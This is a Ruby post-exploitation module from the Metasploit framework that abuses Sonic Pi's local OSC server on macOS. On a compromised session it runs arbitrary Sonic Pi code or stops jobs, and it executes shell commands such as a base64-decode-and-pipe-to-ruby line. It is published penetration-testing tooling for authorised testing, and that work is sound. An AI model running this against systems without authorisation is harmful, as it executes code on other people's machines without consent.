##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'OS X Manage Sonic Pi',
      'Description'   => %q{
        This module controls Sonic Pi via its local OSC server.

        The server runs on 127.0.0.1:4557 and receives OSC messages over UDP.

        Yes, this is RCE, but it's local. I suggest playing music. :-)
      },
      'Author'        => [
        'Sam Aaron', # Sonic Pi
        'wvu'        # Module and Sonic Pi example
      ],
      'References'    => [
        %w[URL https://sonic-pi.net/],
        %w[URL https://github.com/samaaron/sonic-pi/wiki/Sonic-Pi-Internals----GUI-Ruby-API],
        %w[URL http://opensoundcontrol.org/spec-1_0]
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'SessionTypes'  => %w[meterpreter shell],
      'Actions'       => [
        ['Run',  'Description' => 'Run Sonic Pi code'],
        ['Stop', 'Description' => 'Stop all jobs']
      ],
      'DefaultAction' => 'Run',
      'Notes'         => {
        'SideEffects' => [AUDIO_EFFECTS, SCREEN_EFFECTS]
      }
    ))

    register_options([
      OptAddress.new('OSC_HOST',    [true, 'OSC server host', '127.0.0.1']),
      OptPort.new('OSC_PORT',       [true, 'OSC server port', 4557]),
      OptBool.new('START_SONIC_PI', [true, 'Start Sonic Pi', false]),
      OptPath.new(
        'FILE',
        [
          true,
          'Path to Sonic Pi code',
          File.join(Msf::Config.data_directory, 'post', 'sonic_pi_example.rb')
        ]
      )
    ])

    register_advanced_options([
      OptString.new(
        'SonicPiPath',
        [
          true,
          'Path to Sonic Pi executable',
          '/Applications/Sonic Pi.app/Contents/MacOS/Sonic Pi'
        ]
      ),
      OptString.new(
        'RubyPath',
        [
          true,
          'Path to Ruby executable',
          '/Applications/Sonic Pi.app/server/native/ruby/bin/ruby'
        ]
      )
    ])
  end

  def osc_host
    datastore['OSC_HOST']
  end

  def osc_port
    datastore['OSC_PORT']
  end

  def sonic_pi
    datastore['SonicPiPath'].shellescape
  end

  def ruby
    datastore['RubyPath'].shellescape
  end

  def check_lsof
    cmd_exec("lsof -ni :#{osc_port} && echo true").end_with?('true')
  end

  def run
    begin
      unless check_lsof
        print_error('Sonic Pi is not running')

        return if @tried

        if datastore['START_SONIC_PI']
          print_status('Starting Sonic Pi...')

          # XXX: shell_command_token uses ; as a command separator
          cmd_exec("#{sonic_pi} & :")
          sleep(10)

          @tried = true
          raise RuntimeError
        end

        return
      end
    rescue RuntimeError
      retry
    end

    print_good('Sonic Pi is running')

    case action.name
    when 'Run'
      print_status("Running Sonic Pi code: #{datastore['FILE']}")
    when 'Stop'
      print_status('Stopping all jobs')
    end

    cmd = "echo #{Rex::Text.encode_base64(code)} | base64 -D | #{ruby}"

    vprint_status(cmd)
    cmd_exec(cmd)
  end

  def code
    <<~EOF
      require 'socket'
      UDPSocket.new.send("#{msg}", 0, '#{osc_host}', #{osc_port})
    EOF
  end

  def msg
    Rex::Text.to_hex_ascii(
      case action.name
      when 'Run'
        "/run-code\x00\x00\x00,ss\x00#{agent}#{file}"
      when 'Stop'
        "/stop-all-jobs\x00\x00,\x00\x00\x00"
      end
    )
  end

  def agent
    # Generate random null-terminated agent string
    agent = "#{Faker::App.name}\x00"

    # Pad string with nulls until its length is a multiple of 32 bits
    agent << "\x00" until agent.length % 4 == 0

    # Return null-terminated and null-padded string
    agent
  end

  def file
    # Read file as null-terminated string
    @file = "#{File.read(datastore['FILE'])}\x00"

    # Pad string with nulls until its length is a multiple of 32 bits
    @file << "\x00" until @file.length % 4 == 0

    # Return null-terminated and null-padded string
    @file
  end

end
